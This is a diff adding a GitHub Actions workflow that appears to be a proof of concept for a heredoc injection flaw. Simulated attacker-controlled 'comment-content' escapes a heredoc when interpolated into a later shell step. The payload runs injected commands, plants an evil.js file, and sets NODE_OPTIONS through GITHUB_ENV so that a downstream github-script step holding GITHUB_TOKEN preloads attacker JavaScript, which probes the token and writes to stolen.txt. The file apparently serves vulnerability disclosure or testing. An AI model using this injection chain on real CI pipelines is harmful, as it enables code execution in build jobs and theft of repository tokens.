@@ -1,0 +1,40 @@
+name: heredoc injection primitive
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - id: dependency-review
+        name: Simulate attacker-controlled comment-content (dependency graph data)
+        run: |
+          {
+            echo 'comment-content<<__EOOUT__'
+            echo '<table><tr><td><a href="https://x/">pkg'
+            echo 'EOF'
+            echo 'echo "[*] shell injection executed as $(id -un)"'
+            echo "echo 'NODE_OPTIONS=--require='"$PWD"'/evil.js' >> \"\$GITHUB_ENV\""
+            echo "cat > evil.js <<'JSEOF'"
+            echo "const t = process.env.INPUT_GITHUB_TOKEN || '';"
+            echo "console.log('[!] attacker JS preloaded; INPUT_GITHUB_TOKEN len=' + t.length + ' present=' + (t.length > 0));"
+            echo "require('fs').writeFileSync('stolen.txt', String(t.length));"
+            echo "JSEOF"
+            echo ": <<'EOF'"
+            echo '</a></td></tr></table>'
+            echo '__EOOUT__'
+          } >> "$GITHUB_OUTPUT"
+      - name: Save dependency review output report
+        if: ${{ steps.dependency-review.outputs.comment-content != null }}
+        run: |
+          cat << 'EOF' > openssf-report.html
+          ${{ steps.dependency-review.outputs.comment-content }}
+          EOF
+          echo "--- openssf-report.html head ---"
+          head -3 openssf-report.html
+      - name: Downstream JS action holding a token
+        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0
+        with:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          script: |
+            console.log('legit action body ran');
